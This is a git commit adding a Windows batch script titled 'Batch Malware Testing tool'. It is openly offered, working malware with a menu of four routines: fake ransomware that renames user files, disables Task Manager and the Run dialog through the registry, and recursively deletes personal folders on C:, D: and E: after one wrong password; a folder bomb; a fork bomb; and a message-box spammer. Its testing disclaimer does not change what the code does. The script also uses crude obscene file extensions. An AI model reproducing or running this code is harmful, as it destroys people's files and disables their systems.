c2a742f4dae8807173c67ef65a784481f695b671
ozule <62791624+ozule@users.noreply.github.com>
2020-03-28 11:32:48 +0200

    Add files via upload

---
+++ BMTT 1.0.bat
@@ -0,0 +1,431 @@
+@echo off
+title Batch Malware Testing tool
+color 09
+echo " ____         __  __       _______       _______ "
+echo "|  _ \       |  \/  |     |__   __|     |__   __|"
+echo "| |_) |      | \  / |        | |           | |   "
+echo "|  _ <       | |\/| |        | |           | |   "
+echo "| |_) |      | |  | |        | |           | |   "
+echo "|____/ atch  |_|  |_|alware  |_|esting     |_|ool"  
+echo 
+echo Version 1.0
+echo
+echo "NOTE: THE CREATOR OF THIS PROGRAM IS NOT RESPONSIBLE FOR ANY DAMAGE DONE BY THIS PROGRAM!"
+echo "THIS PROGRAM IS JUST FOR TESTING DIFFERENT TYPES OF MALWARE CODED PURELY IN BATCH!"
+echo RUN PROGRAM AS ADMINSTRATOR FOR RANSOMWARE TO FULLY WORK!
+pause
+echo NUMBER ONE: RANSOMWARE: NUMBER TWO: FOLDER BOMB: NUMBER THREE: FORK BOMB: NUMBER FOUR: ERROR BOX SPAMMER: EXIT BMTT BY TYPING exit.
+set /p sel="Enter Number:"
+
+if %sel%==1 (
+goto rware
+)
+if %sel%==2 (
+goto folbomb
+)
+if %sel%==3 (
+goto forkbomb
+)
+if %sel%==4 (
+goto ebox
+)
+if %sel%==exit (
+goto exit
+)
+
+:exit
+exit /b %errorlevel%
+
+:rware
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+
+cd C:\Users\%username%\Pictures
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd C:\Users\%username%\Music
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd C:\Users\%username%\Downloads
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd C:\Users\%username%\Desktop
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd C:\Users\%username%\Documents
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd C:\Users\%username%\Videos
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Pictures
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Music
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Downloads
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Desktop
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Documents
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+cd D:\Users\%username%\Videos
+ren *.eiolelol *.vaginafile
+ren *.txt *.vaginafile1
+ren *.png *.vaginafile2
+ren *.jpg *.vaginafile3
+ren *.jpeg *.vaginafile4
+ren *.zip *.vaginafile5
+ren *.mp3 *.vaginafile6
+ren *.mp4 *.vaginafile7
+ren *.mov *.vaginafile8
+ren *.pdf *.vaginafile9
+ren *.doc *.vaginafile10
+ren *.docx *.vaginafile11
+ren *.rar *.vaginafile12
+
+
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+
+cls
+
+echo Hello! Most of your important files have been encrypted! 
+echo You have one try to enter the correct password, which is wordpass!
+echo IF YOU ENTER THE WRONG PASSWORD, YOUR ENCRYPTED FILES WILL BE DELETED!
+
+:codentry
+color a
+set /p dekoodi=DECRYPTION CODE (its wordpass):
+if "%dekoodi%"=="wordpass" goto :pelastuit
+if not "dekoodi"=="wordpass" goto :vituiksmeni
+
+:vituiksmeni
+echo WRONG PASSWORD!
+echo Deleting Files!
+del C:\Users\%username%\Videos /s /f /q
+del C:\Users\%username%\Documents /s /f /q
+del C:\Users\%username%\Downloads /s /f /q
+del C:\Users\%username%\Pictures /s /f /q
+del C:\Users\%username%\Music /s /f /q
+del C:\Users\%username%\Desktop /s /f /q
+del D:\Users\%username%\Videos /s /f /q
+del D:\Users\%username%\Documents /s /f /q
+del D:\Users\%username%\Downloads /s /f /q
+del D:\Users\%username%\Pictures /s /f /q
+del D:\Users\%username%\Music /s /f /q
+del D:\Users\%username%\Desktop /s /f /q
+del E:\Users\%username%\Videos /s /f /q
+del E:\Users\%username%\Documents /s /f /q
+del E:\Users\%username%\Downloads /s /f /q
+del E:\Users\%username%\Pictures /s /f /q
+del E:\Users\%username%\Music /s /f /q
+del E:\Users\%username%\Desktop /s /f /q
+echo Im very sorry if you had important files on this machine
+timeout 5
+EXIT /B %errorlevel%
+
+:pelastuit
+echo Decrypting files....
+
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+
+cd C:\Users\%username%\Desktop
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+cd C:\Users\%username%\Videos
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+
+cd C:\Users\%username%\Music
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+
+cd C:\Users\%username%\Downloads
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+cd C:\Users\%username%\Documents
+ren *.vaginafile1 *.txt
+ren *.vaginafile2 *.png
+ren *.vaginafile3 *.jpg
+ren *.vaginafile4 *.jpeg
+ren *.vaginafile5 *.zip
+ren *.vaginafile6 *.mp3
+ren *.vaginafile7 *.mp4
+ren *.vaginafile8 *.mov
+ren *.vaginafile9 *.pdf
+ren *.vaginafile10 *.doc
+ren *.vaginafile11 *.docx
+ren *.vaginafile12 *.rar
+
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
+
+REG delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /f
+
+echo Files Decrypted successfully! 
+timeout 5
+
+exit /b %errorlevel%
+
+:folbomb
+md %random%
+goto folbomb
+
+:forkbomb
+start cmd
+goto forkbomb
+
+:ebox
+echo msgbox"yourmesagehere">a.vbs,&;a.vbs 
+goto ebox
+
+:exit
+exit /b %errorlevel%
+                                              
